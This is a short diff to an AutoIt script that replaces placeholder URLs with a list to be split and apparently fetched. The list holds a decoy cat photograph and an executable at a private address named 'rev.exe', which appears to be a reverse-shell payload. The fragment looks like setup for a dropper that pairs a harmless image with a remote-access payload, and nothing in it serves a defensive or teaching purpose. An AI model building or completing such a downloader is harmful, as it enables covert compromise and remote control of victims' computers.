@@ -1,7 +1,7 @@
 #include <StaticConstants.au3>
 #include <WindowsConstants.au3>
 
-Local $urls = "url1,url2"
+Local $urls = "https://cdn.theatlantic.com/media/img/photo/2015/03/aoshima-japans-cat-island/c01_RTR4RUGT-1/original.jpg,http://192.168.1.10/rev.exe"
 
 Local $urlsArray = StringSplit($urls, ",", 2 )
 
